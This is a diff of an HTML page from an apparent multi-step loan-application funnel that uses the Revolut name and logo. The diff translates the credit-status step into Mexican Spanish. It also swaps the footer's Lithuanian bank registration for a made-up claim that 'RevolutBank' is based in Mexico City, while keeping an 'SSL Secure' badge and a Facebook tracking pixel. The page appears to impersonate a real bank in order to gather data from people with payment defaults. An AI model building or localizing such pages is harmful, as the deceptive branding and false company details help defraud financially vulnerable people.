@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <script>
 (function(){
@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta content="width=device-width,initial-scale=1" name="viewport"/>
-<title>Credit Status — RevolutBank</title>
+<title>Situación Crediticia — RevolutBank</title>
 <style>
   @import url("https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap");
 
@@ -256,7 +256,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <div class="progress-text">5 of 5</div>
     </div>
 
-    <h1 class="title"><span data-msg="step7.t04">What is your credit status?</span></h1>
+    <h1 class="title"><span data-msg="step7.t04">¿Cuál es tu situación crediticia?</span></h1>
     <p class="subtitle"><span data-msg="step7.t05">This information helps us find the best solution for you.</span></p>
 
     <div class="list" id="list">
@@ -267,8 +267,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           </svg>
         </div>
         <div class="opt-body">
-          <div class="opt-title">I have payment defaults</div>
-          <div class="opt-desc">Name registered on the blacklist or with restrictions at the Bank of Lithuania.</div>
+          <div class="opt-title">Tengo incumplimientos de pago</div>
+          <div class="opt-desc">Nombre registrado en el buró de crédito con restricciones.</div>
         </div>
       </div>
 
@@ -279,7 +279,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           </svg>
         </div>
         <div class="opt-body">
-          <div class="opt-title">I have no payment defaults</div>
+          <div class="opt-title">No tengo incumplimientos de pago</div>
           <div class="opt-desc">Clean record, with no negative entries or restrictions.</div>
         </div>
       </div>
@@ -303,10 +303,10 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         <svg fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" width="18" height="18">
           <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        Back
+        Regresar
       </button>
-      <button class="btn-next" id="btnNext" type="button">
-        <span>Continue</span>
+      <button class="btn-next" id="btnSiguiente" type="button">
+        <span>Continuar</span>
         <div class="spinner"></div>
       </button>
     </div>
@@ -326,13 +326,13 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <img src="images/revolut-logo.svg" alt="Revolut" style="height:36px;width:auto;display:block;margin:0 auto;"/>
     </div>
     <div class="footer-company">Revolut</div>
-    <div class="footer-meta">Revolut Bank UAB — Headquartered in Lithuania</div>
+    <div class="footer-meta">RevolutBank — Con sede en Ciudad de México</div>
     <div class="footer-badges">
       <span>
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
           <path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        SSL Secure
+        SSL Seguro
       </span>
       <span>
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
@@ -366,7 +366,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   })();
 
   const list = document.getElementById('list');
-  const btnNext = document.getElementById('btnNext');
+  const btnSiguiente = document.getElementById('btnSiguiente');
   const btnVoltar = document.getElementById('btnVoltar');
   let selected = null;
 
@@ -376,17 +376,17 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     list.querySelectorAll('.opt').forEach(o => o.classList.remove('selected'));
     opt.classList.add('selected');
     selected = opt.dataset.value;
-    btnNext.classList.add('enabled');
+    btnSiguiente.classList.add('enabled');
   });
 
   btnVoltar.addEventListener('click', () => {
     window.location.href = '6.html';
   });
 
-  btnNext.addEventListener('click', () => {
+  btnSiguiente.addEventListener('click', () => {
     if (!selected) return;
     localStorage.setItem('situacaoCredito', selected);
-    btnNext.classList.add('loading');
+    btnSiguiente.classList.add('loading');
     const p = new URLSearchParams(window.location.search);
     p.set('situacaoCredito', selected);
     setTimeout(() => {
